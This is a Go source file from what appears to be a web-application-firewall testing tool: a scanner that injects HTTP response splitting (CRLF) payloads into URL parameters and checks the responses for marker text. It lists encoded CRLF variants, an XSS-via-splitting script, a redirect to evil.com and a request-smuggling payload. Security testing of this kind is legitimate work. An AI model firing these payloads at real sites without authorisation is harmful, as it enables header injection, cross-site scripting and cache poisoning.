// Package responsesplit provides HTTP Response Splitting testing
package responsesplit

import (
	"context"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/waftester/waftester/pkg/attackconfig"
	"github.com/waftester/waftester/pkg/defaults"
	"github.com/waftester/waftester/pkg/httpclient"
	"github.com/waftester/waftester/pkg/iohelper"
)

// Config configures HTTP response splitting testing
type Config struct {
	attackconfig.Base
	Headers map[string]string
}

// DefaultConfig returns sensible defaults
func DefaultConfig() Config {
	return Config{
		Base: attackconfig.Base{
			Concurrency: defaults.ConcurrencyMedium,
			Timeout:     httpclient.TimeoutProbing,
		},
	}
}

// Result represents a response splitting test result
type Result struct {
	URL          string
	Parameter    string
	Payload      string
	Location     string // header or body
	StatusCode   int
	ResponseSize int
	Vulnerable   bool
	Evidence     string
	Severity     string
	Timestamp    time.Time
}

// Scanner performs HTTP response splitting testing
type Scanner struct {
	config  Config
	client  *http.Client
	results []Result
	mu      sync.RWMutex
}

// NewScanner creates a new response splitting scanner
func NewScanner(config Config) *Scanner {
	if config.Concurrency <= 0 {
		config.Concurrency = defaults.ConcurrencyMedium
	}
	if config.Timeout <= 0 {
		config.Timeout = httpclient.TimeoutProbing
	}

	return &Scanner{
		config:  config,
		client:  httpclient.Default(),
		results: make([]Result, 0),
	}
}

// Scan tests a URL for HTTP response splitting
func (s *Scanner) Scan(ctx context.Context, targetURL string, params map[string]string) ([]Result, error) {
	results := make([]Result, 0)

	for param := range params {
		for _, payload := range Payloads() {
			testParams := make(map[string]string)
			for k, v := range params {
				testParams[k] = v
			}
			testParams[param] = payload.Value

			result := s.testPayload(ctx, targetURL, param, payload, testParams)
			if result.Vulnerable {
				s.config.NotifyVulnerabilityFound()
				results = append(results, result)
			}
		}
	}

	s.mu.Lock()
	s.results = append(s.results, results...)
	s.mu.Unlock()

	return results, nil
}

// Payload represents a response splitting payload
type Payload struct {
	Value   string
	Encoded bool
	Type    string
}

// testPayload tests a single response splitting payload
func (s *Scanner) testPayload(ctx context.Context, targetURL, param string, payload Payload, params map[string]string) Result {
	result := Result{
		URL:       targetURL,
		Parameter: param,
		Payload:   payload.Value,
		Timestamp: time.Now(),
	}

	req, err := http.NewRequestWithContext(ctx, "GET", targetURL+"?"+buildQuery(params), nil)
	if err != nil {
		return result
	}

	for k, v := range s.config.Headers {
		req.Header.Set(k, v)
	}

	resp, err := s.client.Do(req)
	if err != nil {
		return result
	}
	defer iohelper.DrainAndClose(resp.Body)

	body, _ := iohelper.ReadBodyDefault(resp.Body)
	result.StatusCode = resp.StatusCode
	result.ResponseSize = len(body)

	// Check headers for injection
	vulnerable, evidence, location := s.detectVulnerability(resp, string(body), payload)
	result.Vulnerable = vulnerable
	result.Evidence = evidence
	result.Location = location
	if vulnerable {
		result.Severity = "high"
	}

	return result
}

func buildQuery(params map[string]string) string {
	vals := make(url.Values, len(params))
	for k, v := range params {
		vals.Set(k, v)
	}
	return vals.Encode()
}

// detectVulnerability checks for response splitting indicators
func (s *Scanner) detectVulnerability(resp *http.Response, body string, payload Payload) (bool, string, string) {
	// Check if our injected header appears
	injectedHeaders := []string{
		"X-Injected",
		"Set-Cookie",
		"Injected",
	}

	for _, header := range injectedHeaders {
		if val := resp.Header.Get(header); val != "" {
			if strings.Contains(val, "INJECTED") || strings.Contains(val, "malicious") {
				return true, "Injected header found: " + header + ": " + val, "header"
			}
		}
	}

	// Check for CRLF sequence in response body that might indicate splitting
	if strings.Contains(body, "X-Injected") || strings.Contains(body, "Set-Cookie: INJECTED") {
		return true, "Response splitting detected in body", "body"
	}

	// Check for double newlines indicating header injection
	if strings.Contains(body, "\r\n\r\n") && strings.Contains(payload.Value, "\r\n") {
		// Only flag if our marker is present
		if strings.Contains(body, "INJECTED") {
			return true, "CRLF injection detected", "body"
		}
	}

	return false, "", ""
}

// GetResults returns all results
func (s *Scanner) GetResults() []Result {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return append([]Result{}, s.results...)
}

// Payloads returns HTTP response splitting payloads
func Payloads() []Payload {
	return []Payload{
		// Basic CRLF injection
		{Value: "test\r\nX-Injected: INJECTED", Encoded: false, Type: "crlf"},
		{Value: "test\r\nSet-Cookie: INJECTED=1", Encoded: false, Type: "crlf"},

		// URL encoded
		{Value: "test%0d%0aX-Injected:%20INJECTED", Encoded: true, Type: "crlf-encoded"},
		{Value: "test%0d%0aSet-Cookie:%20INJECTED=1", Encoded: true, Type: "crlf-encoded"},
		{Value: "test%0D%0AX-Injected:%20INJECTED", Encoded: true, Type: "crlf-encoded"},

		// Double encoding
		{Value: "test%250d%250aX-Injected:%20INJECTED", Encoded: true, Type: "double-encoded"},
		{Value: "test%25%30%64%25%30%61X-Injected:%20INJECTED", Encoded: true, Type: "double-encoded"},

		// Unicode variants
		{Value: "test\u000d\u000aX-Injected: INJECTED", Encoded: false, Type: "unicode"},
		{Value: "test%E5%98%8A%E5%98%8DX-Injected:%20INJECTED", Encoded: true, Type: "unicode-encoded"},

		// LF only (some servers)
		{Value: "test\nX-Injected: INJECTED", Encoded: false, Type: "lf"},
		{Value: "test%0aX-Injected:%20INJECTED", Encoded: true, Type: "lf-encoded"},

		// Header injection payloads
		{Value: "test\r\n\r\n<html>INJECTED</html>", Encoded: false, Type: "body-injection"},
		{Value: "test%0d%0a%0d%0a<html>INJECTED</html>", Encoded: true, Type: "body-injection"},

		// XSS via response splitting
		{Value: "test\r\nContent-Type: text/html\r\n\r\n<script>alert('INJECTED')</script>", Encoded: false, Type: "xss"},
	}
}

// HeaderInjectionPayloads returns payloads for header injection testing
func HeaderInjectionPayloads() []Payload {
	return []Payload{
		{Value: "test\r\nLocation: http://evil.com", Encoded: false, Type: "redirect"},
		{Value: "test\r\nX-XSS-Protection: 0", Encoded: false, Type: "security-disable"},
		{Value: "test\r\nContent-Length: 0\r\n\r\nInjected", Encoded: false, Type: "smuggling"},
	}
}
